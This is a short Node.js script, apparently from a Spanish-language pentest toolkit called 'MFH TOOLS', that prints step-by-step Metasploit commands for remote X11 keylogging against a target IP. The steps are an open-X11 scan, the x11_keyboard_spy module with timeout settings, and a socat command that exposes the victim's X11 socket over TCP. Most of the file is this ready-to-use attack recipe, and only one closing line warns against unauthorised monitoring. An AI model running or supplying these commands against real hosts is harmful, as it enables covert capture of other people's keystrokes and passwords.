#!/usr/bin/env node
/**
 * MFH TOOLS - Keylogger
 * Acceso con Credenciales
 * 
 * Integración: xspy (X11 Keyboard Spy vía Metasploit)
 * 
 * Uso: node keylogger.js --target <IP> [--port 6000] [--timeout 600]
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

const TOOLS = {
    xspy: {
        name: 'Xspy (X11 Keyboard Spy)',
        description: 'Herramienta de registro de teclado X11, implementada mediante módulo de Metasploit',
        install: [
            'Kali Linux incluye Metasploit Framework',
            'sudo apt install metasploit-framework',
            '# O usar socat en el objetivo para abrir el puerto X11',
            'socat TCP-LISTEN:6000,reuseaddr,fork UNIX-CLIENT:/tmp/.X11-unix/X0'
        ],
        usage: [
            'msfconsole',
            'use auxiliary/gather/x11_keyboard_spy',
            'set rhosts <target_ip>',
            'set rport 6000',
            'set LISTENER_TIMEOUT 600',
            'run'
        ],
        notes: [
            'Requiere que el puerto X11 del objetivo esté abierto (por defecto 6000)',
            'LISTENER_TIMEOUT establece los segundos de escucha (0=permanente)',
            'PRINTERVAL establece el intervalo de salida (por defecto 60 segundos)',
            'El módulo de Metasploit reemplaza a la herramienta original xspy'
        ]
    }
};

function printReport(target, port, timeout) {
    console.log('');
    console.log('═'.repeat(65));
    console.log('  ⌨️ REPORTE DE KEYLOGGER');
    console.log('  Objetivo: ' + (target || 'No especificado'));
    console.log('  Puerto: ' + (port || '6000'));
    console.log('  Timeout: ' + (timeout || '600') + ' segundos');
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('═'.repeat(65));
    console.log('');

    var tool = TOOLS.xspy;
    console.log('📌 ' + tool.name);
    console.log('   ' + tool.description);
    console.log('');
    console.log('   🔧 Instalación/Preparación:');
    tool.install.forEach(function(line) { console.log('      ' + line); });
    console.log('');
    console.log('   💻 Comandos de Metasploit:');
    tool.usage.forEach(function(line) { console.log('      ' + line); });
    console.log('');
    console.log('   📝 Notas:');
    tool.notes.forEach(function(line) { console.log('      • ' + line); });
    console.log('');

    console.log('─'.repeat(65));
    console.log('  🔧 Pasos previos:');
    console.log('');
    console.log('  1. Escanear el puerto X11 del objetivo:');
    console.log('     use auxiliary/scanner/x11/open_x11');
    console.log('     set rhosts ' + (target || '<target>'));
    console.log('     run');
    console.log('');
    console.log('  2. Establecer conexión X11 y registrar el teclado:');
    console.log('     use auxiliary/gather/x11_keyboard_spy');
    console.log('     set rhosts ' + (target || '<target>'));
    console.log('     set rport ' + (port || '6000'));
    console.log('     set LISTENER_TIMEOUT ' + (timeout || '600'));
    console.log('     run');
    console.log('');
    console.log('─'.repeat(65));
    console.log('  ⚠️ ADVERTENCIA');
    console.log('     El registro de teclado solo se permite en sistemas que tengas derecho de monitorear.');
    console.log('     La vigilancia no autorizada es ilegal.');
    console.log('─'.repeat(65));
    console.log('');
}

function main() {
    var args = process.argv.slice(2);
    var targetIdx = args.indexOf('--target');
    var portIdx = args.indexOf('--port');
    var timeoutIdx = args.indexOf('--timeout');

    if (targetIdx === -1) {
        console.log('');
        console.log('╔══════════════════════════════════════════════════════╗');
        console.log('║  MFH TOOLS — Keylogger v' + CONFIG.version + '                       ║');
        console.log('║  ' + CONFIG.author + '                              ║');
        console.log('╚══════════════════════════════════════════════════════╝');
        console.log('');
        console.log('  Uso: node keylogger.js --target <IP> [--port 6000] [--timeout 600]');
        console.log('');
        console.log('  Herramientas:');
        console.log('    • xspy - X11 Keyboard Spy (vía Metasploit)');
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node keylogger.js --target 192.168.1.100');
        console.log('    node keylogger.js --target 192.168.1.100 --port 6000 --timeout 300');
        console.log('');
        process.exit(0);
    }

    var target = args[targetIdx + 1];
    var port = portIdx !== -1 ? args[portIdx + 1] : '6000';
    var timeout = timeoutIdx !== -1 ? args[timeoutIdx + 1] : '600';

    console.log('\n⌨️ Generando comandos de Keylogger...\n');
    printReport(target, port, timeout);
}

main();
